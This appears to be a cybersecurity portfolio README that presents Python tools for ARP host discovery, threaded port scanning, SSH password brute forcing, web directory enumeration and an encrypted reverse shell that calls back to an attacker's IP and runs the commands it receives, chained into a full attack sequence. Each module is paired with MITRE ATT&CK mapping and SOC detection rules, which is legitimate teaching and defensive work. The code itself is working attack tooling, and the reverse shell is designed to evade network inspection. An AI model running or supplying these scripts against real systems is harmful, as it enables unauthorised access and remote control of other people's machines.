# Python Security Automation & Offensive Scripting | SOC-Relevant Project

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Scapy](https://img.shields.io/badge/Scapy-Packet_Crafting-green?style=for-the-badge)
![Paramiko](https://img.shields.io/badge/Paramiko-SSH_Automation-yellow?style=for-the-badge)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-Mapped-blue?style=for-the-badge)

-----

## Project Overview

This project covers two Python scripting tools built for security automation — a dual-mode network reconnaissance scanner using ARP packet crafting, and a multi-function offensive automation framework covering port scanning, SSH brute force, directory enumeration, and encrypted reverse shell deployment. Both tools demonstrate the scripting capability expected of a security analyst who can build detection and simulation tooling from scratch.

**Skills Demonstrated:**

- Low-level packet crafting and ARP-based host discovery using Scapy
- Multi-threaded TCP port scanning with socket programming
- SSH brute force automation using Paramiko with wordlist iteration
- HTTP-based directory enumeration using Requests
- Encrypted reverse shell implementation with persistent command execution loop
- MITRE ATT&CK TTP mapping across all scripted techniques

**Libraries & Technologies:**
`Python` · `Scapy` · `Socket` · `Paramiko` · `Requests` · `Cryptography` · `Threading`

**Full Visual Report:** [Download PDF Report Case 1 →](https://github.com/abhishekbommisetty/CYBERSECURITY---PORTFOLIO-/blob/36b6eccc5c687455260d77e70ea5784ac3a74678/python-scripting/Script%20for%20network-recon.pdf)

**Full Visual Report:** [Download PDF Report Case 2 →](https://github.com/abhishekbommisetty/CYBERSECURITY---PORTFOLIO-/blob/e2ebd6ca2ffdc0edfbb498d080bc8a6b33382c36/python-scripting/Script%20for%20attack%20automation.pdf)


-----

## Project Summary Table

|Case|Tool Built                    |Core Techniques                                                           |MITRE TTPs                        |
|----|------------------------------|--------------------------------------------------------------------------|----------------------------------|
|1   |Network Reconnaissance Tool   |Passive ARP sniffing, Active ARP scanning, dual-mode host discovery       |T1040, T1018                      |
|2   |Offensive Automation Framework|Port scanning, SSH brute force, directory busting, encrypted reverse shell|T1046, T1110.001, T1083, T1059.004|

-----

## Case 1 — Network Reconnaissance Automation Tool (T1040, T1018)

### Tool Overview

|Field       |Value                                                    |
|------------|---------------------------------------------------------|
|Language    |Python 3                                                 |
|Core Library|Scapy                                                    |
|Modes       |Passive (ARP sniffing) + Active (ARP scanning)           |
|Purpose     |Stealthy host discovery and network inventory enumeration|

-----

### Why This Tool Was Built

Existing tools like Nmap generate significant network noise detectable by IDS/IPS. This tool was built to demonstrate two contrasting reconnaissance approaches — a completely passive mode that generates zero outbound packets, and an active mode that performs targeted ARP-based host discovery faster than a full TCP port scan. Understanding both techniques is directly relevant to SOC work: passive sniffing is how attackers perform initial network mapping without triggering alerts, and detecting ARP-based scanning is a core network monitoring skill.

-----

### Implementation

**Passive Mode — ARP Traffic Sniffing**

```python
from scapy.all import sniff, ARP

def process_packet(packet):
    if packet.haslayer(ARP) and packet[ARP].op == 1:  # ARP request
        print(f"[+] Host Detected — IP: {packet[ARP].psrc} | MAC: {packet[ARP].hwsrc}")

def passive_scan():
    print("[*] Starting passive ARP sniff — listening for network traffic...")
    sniff(filter="arp", prn=process_packet, store=False)
```

**Why:** `sniff()` with `filter="arp"` captures only ARP packets from the network interface — zero packets sent, zero detection footprint. `op == 1` filters to ARP requests specifically (as opposed to replies), identifying hosts actively communicating on the subnet. Each captured packet reveals the source IP and MAC address of the transmitting host, building a live network map purely from observed traffic.

**Passive mode SOC relevance:** Attackers performing pre-exploitation reconnaissance frequently use passive sniffing to avoid triggering network-based IDS rules. A SOC analyst who understands this technique knows to look for signs of passive recon in endpoint logs rather than relying solely on network alerts.

-----

**Active Mode — ARP Request Scanning**

```python
from scapy.all import ARP, Ether, srp

def active_scan(target_ip):
    print(f"[*] Starting active ARP scan on {target_ip}...")
    arp_request = ARP(pdst=target_ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered, _ = srp(packet, timeout=2, verbose=False)

    print("\n[+] Live Hosts Discovered:")
    print(f"{'IP Address':<20}{'MAC Address'}")
    print("-" * 40)
    for _, received in answered:
        print(f"{received[ARP].psrc:<20}{received[ARP].hwsrc}")
```

**Why:** ARP operates at Layer 2 — unlike ICMP ping scans, ARP requests cannot be blocked by host-based firewalls, making this technique more reliable for host discovery within a local subnet. `srp()` (send/receive at Layer 2) sends the crafted ARP request to the broadcast address and collects responses — only live hosts respond. The timeout of 2 seconds balances speed against missed responses from slower hosts.

**Active mode SOC relevance:** ARP scanning is a common first step in post-compromise lateral movement — an attacker who has compromised one host will ARP scan the subnet to identify additional targets. SOC detection: alert on a single host sending ARP requests to more than 10 unique IPs within 30 seconds.

-----

### Key Technical Decisions

- **Dual-mode design** — passive mode for stealth scenarios, active mode for speed; operator chooses based on detection risk tolerance
- **`store=False` in sniff()** — prevents memory accumulation during long passive sessions; packets processed and discarded in real time
- **Broadcast Ethernet frame** (`ff:ff:ff:ff:ff:ff`) — ensures ARP request reaches all Layer 2 hosts on the segment regardless of IP routing

**MITRE ATT&CK:**

- `T1040 — Network Sniffing` (passive ARP capture mode)
- `T1018 — Remote System Discovery` (active ARP host enumeration)

-----

### SOC Detection Guidance

|Technique           |Detection Method                                                                                                       |
|--------------------|-----------------------------------------------------------------------------------------------------------------------|
|Passive ARP sniffing|Endpoint telemetry — promiscuous mode enabled on NIC (check via `ip link show`); unusual process with raw socket access|
|Active ARP scanning |Network alert — single host sending ARP requests to >10 IPs within 30 seconds; `arpwatch` anomaly alert                |

-----

## Case 2 — Offensive Security Automation Framework (T1046, T1110.001, T1083, T1059.004)

### Tool Overview

|Field         |Value                                                                                      |
|--------------|-------------------------------------------------------------------------------------------|
|Language      |Python 3                                                                                   |
|Core Libraries|Socket, Paramiko, Requests, Cryptography, Threading                                        |
|Modules       |Port Scanner, SSH Brute Force, Directory Buster, Encrypted Reverse Shell                   |
|Purpose       |Simulate attacker automation workflow across reconnaissance, access, and persistence stages|

-----

### Why This Tool Was Built

Real-world attackers chain multiple techniques in sequence — port scan to identify services, brute force to gain access, directory enumeration to identify attack surface, and reverse shell for persistent control. Building these as integrated Python modules demonstrates both the offensive technique and the scripting ability to automate multi-stage attack chains — directly relevant for SOC analysts who need to understand what attacker tooling looks like to build accurate detection rules.

-----

### Module 1 — Multi-Threaded Port Scanner

```python
import socket
import threading

open_ports = []
lock = threading.Lock()

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            with lock:
                open_ports.append(port)
                print(f"[+] Port {port} OPEN")
        sock.close()
    except socket.error:
        pass

def port_scan(target, port_range):
    print(f"[*] Scanning {target} — ports {port_range[0]}-{port_range[-1]}")
    threads = []
    for port in port_range:
        t = threading.Thread(target=scan_port, args=(target, port))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(f"\n[*] Scan complete — {len(open_ports)} open ports found")
```

**Why:** `connect_ex()` returns 0 on successful connection rather than raising an exception — cleaner for scanning than `connect()`. Threading allows concurrent port checks rather than sequential scanning — dramatically reduces scan time across large port ranges. `threading.Lock()` prevents race conditions when multiple threads write to `open_ports` simultaneously. `settimeout(1)` prevents threads hanging on filtered ports indefinitely.

**MITRE ATT&CK:** `T1046 — Network Service Scanning`

-----

### Module 2 — SSH Brute Force Automation

```python
import paramiko

def ssh_brute_force(target, username, wordlist_path):
    print(f"[*] Starting SSH brute force on {target} — user: {username}")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(wordlist_path, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        try:
            client.connect(target, username=username, password=password, timeout=3)
            print(f"[+] SUCCESS — Password found: {password}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
        except Exception as e:
            print(f"[!] Connection error: {e}")
            break

    print("[-] Brute force complete — no valid password found")
    return None
```

**Why:** `paramiko.AutoAddPolicy()` accepts unknown SSH host keys automatically — necessary in lab environments where host key verification would block every connection attempt. The wordlist is read once into memory before the loop rather than reopening the file per attempt — more efficient for large wordlists. `AuthenticationException` is caught specifically to distinguish failed credentials from network errors, allowing the loop to continue on auth failure but stop on connectivity issues.

**SOC detection:** Alert on >5 SSH authentication failures from a single source IP within 60 seconds (Event ID equivalent: auth log `Failed password` burst) — the exact pattern this module generates.

**MITRE ATT&CK:** `T1110.001 — Brute Force: Password Guessing`

-----

### Module 3 — HTTP Directory Enumeration

```python
import requests
import threading

def dir_buster(target_url, wordlist_path, threads=10):
    print(f"[*] Starting directory enumeration on {target_url}")

    with open(wordlist_path, 'r') as f:
        directories = f.read().splitlines()

    def check_directory(directory):
        url = f"{target_url}/{directory}"
        try:
            response = requests.get(url, timeout=3)
            if response.status_code == 200:
                print(f"[+] FOUND: {url} — Status: {response.status_code}")
            elif response.status_code == 403:
                print(f"[!] FORBIDDEN (exists but restricted): {url}")
        except requests.ConnectionError:
            pass

    thread_list = []
    for directory in directories:
        t = threading.Thread(target=check_directory, args=(directory,))
        thread_list.append(t)
        t.start()
        if len(thread_list) >= threads:
            for t in thread_list:
                t.join()
            thread_list = []
```

**Why:** Threading is throttled to a configurable batch size (default 10) — unlimited threads would overwhelm the target server or trigger rate limiting. Both `200 OK` and `403 Forbidden` responses are flagged — a 403 confirms the directory exists even though access is denied, which is still valuable intelligence for an attacker (and a detection indicator for a defender). `ConnectionError` is silently passed to keep output clean for valid responses only.

**MITRE ATT&CK:** `T1083 — File and Directory Discovery`

-----

### Module 4 — Encrypted Reverse Shell

```python
import socket
import subprocess
from cryptography.fernet import Fernet

# Key must be pre-shared between attacker and implant
KEY = Fernet.generate_key()
cipher = Fernet(KEY)

def reverse_shell(attacker_ip, attacker_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((attacker_ip, attacker_port))

    while True:
        # Receive encrypted command from attacker
        encrypted_command = sock.recv(4096)
        command = cipher.decrypt(encrypted_command).decode()

        if command.lower() == "exit":
            break

        # Execute command and encrypt output before sending
        output = subprocess.run(
            command, shell=True, capture_output=True, text=True
        )
        response = output.stdout + output.stderr
        encrypted_response = cipher.encrypt(response.encode())
        sock.sendall(encrypted_response)

    sock.close()
```

**Why:** Fernet symmetric encryption wraps all command and output traffic — a network analyst capturing this traffic sees only encrypted bytes, not plaintext shell commands. This directly simulates how modern RATs and C2 implants avoid detection by network-based DPI (Deep Packet Inspection) tools. `subprocess.run()` with `capture_output=True` captures both stdout and stderr — ensuring error messages from failed commands are returned to the attacker rather than silently dropped. The persistent `while True` loop maintains the shell session until an explicit `exit` command is received.

**SOC detection:** Encrypted reverse shells evade content-based detection — detection relies on behavioral indicators: unexpected outbound connections from non-browser processes, long-duration TCP sessions to non-standard ports, and process spawning `subprocess`/`cmd.exe` as a child of a non-interactive parent.

**MITRE ATT&CK:** `T1059.004 — Command and Scripting Interpreter: Unix Shell`

-----

### Full Attack Chain — How These Modules Chain Together

```
[1] port_scan(target, range(1, 1025))      # Identify open services
        ↓
[2] ssh_brute_force(target, "admin", "rockyou.txt")   # Gain SSH access
        ↓
[3] dir_buster("http://target", "common.txt")          # Enumerate web surface
        ↓
[4] reverse_shell(attacker_ip, 4444)       # Deploy encrypted persistent shell
```

This chain mirrors a real attacker workflow — each module feeds intelligence into the next stage, progressing from discovery through access to persistent control.

**MITRE ATT&CK — Full Chain:**

- `T1046 — Network Service Scanning` (port scanner)
- `T1110.001 — Brute Force: Password Guessing` (SSH brute force)
- `T1083 — File and Directory Discovery` (directory buster)
- `T1059.004 — Command and Scripting Interpreter: Unix Shell` (encrypted reverse shell)

-----

### SOC Detection Guidance

|Module          |Behavioral Indicator                               |Detection Rule                                                               |
|----------------|---------------------------------------------------|-----------------------------------------------------------------------------|
|Port Scanner    |High volume SYN packets from single source         |Alert: >100 unique destination ports from one IP in 10 seconds               |
|SSH Brute Force |Auth failure burst in SSH logs                     |Alert: >5 `Failed password` events from single IP within 60 seconds          |
|Directory Buster|High-frequency HTTP 404s from single IP            |Alert: >50 HTTP 404 responses to same host within 30 seconds                 |
|Reverse Shell   |Encrypted outbound session from non-browser process|Alert: Long-duration TCP session on non-standard port from unexpected process|

-----

## Project Summary

Across two scripting projects, this work demonstrates Python security automation capability from both offensive and defensive perspectives:

- **Case 1** → Built a dual-mode ARP reconnaissance tool using Scapy — passive sniffing generates zero network noise while active scanning enumerates all live hosts via Layer 2 ARP requests, bypassing host-based firewalls that block ICMP
- **Case 2** → Built a four-module offensive automation framework — multi-threaded port scanner, SSH brute force with Paramiko, HTTP directory enumerator with throttled threading, and an encrypted reverse shell using Fernet symmetric encryption to evade DPI-based network detection

All techniques are mapped to MITRE ATT&CK and paired with SOC detection guidance — demonstrating understanding of both the offensive technique and how a defender would detect it.

-----

> **Note:** All scripts were developed and executed exclusively in isolated lab environments against intentionally vulnerable or locally controlled systems. These tools are built for security education, detection engineering, and SOC simulation purposes only.
